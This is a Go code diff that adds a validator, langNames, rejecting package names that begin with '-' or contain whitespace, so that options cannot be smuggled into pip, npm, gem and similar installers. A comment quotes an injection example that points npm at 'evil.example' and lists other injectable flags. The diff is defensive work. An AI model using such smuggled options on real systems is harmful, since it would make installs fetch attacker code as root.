@@ -41,6 +41,32 @@ func langRun(c *exec.Context, tool, cwd string, argv ...string) (exec.Result, er
 	})
 }
 
+// langNames reads the list argument key -- `pkgs`, `gems`, `crates`,
+// `modules` -- and refuses it if any item could reach the tool as an
+// option rather than as a name. It is the only way the functions of these
+// modules read a list of names, for the reason pkgValidateName gives.
+//
+// M-32 of issue #321 put that check into the OS package managers and not
+// into these, so `pkgs: ["--registry=https://evil.example", left-pad]`
+// made `npm install --global` fetch from an index the tree never named --
+// as root, from whoever could write the list -- and gem's `--source=`,
+// pip's `--index-url=`, go's `-toolexec=` and cpan's `-j` were the same
+// door. DIVERGENCE 5.568.
+//
+// The rule is pkgValidateName's and not one per ecosystem, for the reason
+// it gives there: refusing a leading `-` and whitespace or control
+// characters needs no claim about any tool's grammar, and every legitimate
+// shape -- pip's `requests[socks]>=2`, npm's `@scope/name@1.0`, go's
+// `golang.org/x/tools/cmd/stringer@latest`, composer's `vendor/name:^3.0`,
+// cpan's `JSON::PP` -- begins with something else.
+func langNames(args *value.Map, key string) ([]string, error) {
+	names := states.Strings(args, key)
+	if err := pkgValidateNames(names); err != nil {
+		return nil, err
+	}
+	return names, nil
+}
+
 // langVersion is the `version` function every one of these modules has.
 func langVersion(module, tool string, argv []string, clean func(string) string) exec.Module {
 	return exec.Module{
@@ -157,6 +183,10 @@ func registerPip(r *Registries) {
 				Section:  "15.4",
 			},
 			Fn: func(c *exec.Context, args *value.Map) (any, error) {
+				pkgs, err := langNames(args, "pkgs")
+				if err != nil {
+					return nil, err
+				}
 				argv := []string{"install"}
 				if states.Bool(args, "upgrade", false) {
 					argv = append(argv, "--upgrade")
@@ -164,7 +194,7 @@ func registerPip(r *Registries) {
 				if u := states.Str(args, "index_url", ""); u != "" {
 					argv = append(argv, "--index-url", u)
 				}
-				argv = append(argv, states.Strings(args, "pkgs")...)
+				argv = append(argv, pkgs...)
 				if c.Test {
 					return wouldRun("pip", argv...), nil
 				}
@@ -188,7 +218,11 @@ func registerPip(r *Registries) {
 				Section:  "15.4",
 			},
 			Fn: func(c *exec.Context, args *value.Map) (any, error) {
-				argv := append([]string{"uninstall", "--yes"}, states.Strings(args, "pkgs")...)
+				pkgs, err := langNames(args, "pkgs")
+				if err != nil {
+					return nil, err
+				}
+				argv := append([]string{"uninstall", "--yes"}, pkgs...)
 				if c.Test {
 					return wouldRun("pip", argv...), nil
 				}
